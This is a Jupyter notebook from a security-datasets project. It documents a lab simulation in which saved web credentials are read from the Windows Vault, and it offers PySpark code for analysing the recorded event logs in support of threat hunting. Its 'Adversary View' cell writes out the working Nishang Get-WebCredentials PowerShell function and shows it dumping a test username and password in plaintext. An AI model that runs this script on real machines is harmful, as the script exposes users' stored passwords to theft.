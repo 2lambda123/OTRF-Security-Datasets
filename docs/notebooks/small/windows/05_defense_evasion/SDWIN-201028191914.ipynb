{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "e1d7c63e",
   "metadata": {},
   "source": [
    "# Windows Vault Web Credentials"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8b8c9837",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3a05d162",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/10/28 |\n",
    "| Modification Date | 2020/10/28 |\n",
    "| Tactics           | ['[TA0004](https://attack.mitre.org/tactics/TA0004)', '[TA0005](https://attack.mitre.org/tactics/TA0005)'] |\n",
    "| Techniques        | ['[T1055](https://attack.mitre.org/techniques/T1055)'] |\n",
    "| Tags              | None |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e51a3f0f",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents threat actors accessing the Windows Vault and reading web credentials saved."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1b76135a",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "406d8b30",
   "metadata": {},
   "source": [
    "\n",
    "| Dataset Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/small/windows/credential_access/host/psh_windows_vault_web_credentials.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/small/windows/credential_access/host/psh_windows_vault_web_credentials.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "52b2b87d",
   "metadata": {},
   "source": [
    "## Notebooks\n",
    "Notebooks created by the community leveraging the mordor datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a1e29cb8",
   "metadata": {},
   "source": [
    "\n",
    "| Author | Name | Link |\n",
    "|:-------|:-----|:-----|"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e5b60a9c",
   "metadata": {},
   "source": [
    "## Simulation Plan"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e16c17d3",
   "metadata": {},
   "source": [
    "\n",
    "| Environment | Tool Type | Module |\n",
    "|:------------|:----------|:-------|\n",
    "| Lab VM | Manual | [PowerShell](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6f9157f4",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "Add Web Credentials\n",
    "-------------------\n",
    "PS > $pv = New-Object Windows.Security.Credentials.PasswordVault\n",
    "PS > $pw = New-Object Windows.Security.Credentials.PasswordCredential('http://ossemproject.com', 'pgustavo', 'Pass@Word')\n",
    "PS >$pv.Add($pw)\n",
    "\n",
    "Import Get-WebCredentials\n",
    "-------------------------\n",
    "function Get-WebCredentials\n",
    "{\n",
    "  <#\n",
    "  .SYNOPSIS\n",
    "  Nishang script to retrieve web credentials from Windows vault (requires PowerShell v3 and above)\n",
    "  .DESCRIPTION\n",
    "  This script can be used to retreive web credentiaks stored in Windows Valut from Windows 8 onwards. The script \n",
    "  also needs PowerShell v3 onwards and must be run from an elevated shell.\n",
    "  .EXAMPLE\n",
    "  PS > Get-WebCredentials\n",
    "  .LINK\n",
    "  https://github.com/samratashok/nishang\n",
    "  #>\n",
    "  [CmdletBinding()] Param ()\n",
    "  \n",
    "  \n",
    "  #http://stackoverflow.com/questions/9221245/how-do-i-store-and-retrieve-credentials-from-the-windows-vault-credential-manage\n",
    "  $ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]\n",
    "  $VaultObj = new-object Windows.Security.Credentials.PasswordVault\n",
    "  $VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ }\n",
    "}\n",
    "\n",
    "Run Get-WebCredentials\n",
    "----------------------\n",
    "PS C:\\Users\\wardog> Get-WebCredentials\n",
    "\n",
    "UserName Resource                Password  Properties\n",
    "-------- --------                --------  ----------\n",
    "pgustavo http://ossemproject.com Pass@Word {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], ...\n",
    "\n",
    "\n",
    "PS C:\\Users\\wardog>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3abc7383",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5e182c45",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f20e6d81",
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1a536883",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e1859348",
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/small/windows/credential_access/host/psh_windows_vault_web_credentials.zip\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "26fdae4c",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c9592159",
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "'''\n",
    "SELECT Hostname,Channel,EventID, Count(*) as count\n",
    "FROM mordorTable\n",
    "GROUP BY Hostname,Channel,EventID\n",
    "ORDER BY count DESC\n",
    "'''\n",
    ")\n",
    "df.show(truncate=False)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "PySpark_Python3",
   "language": "python",
   "name": "pyspark3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
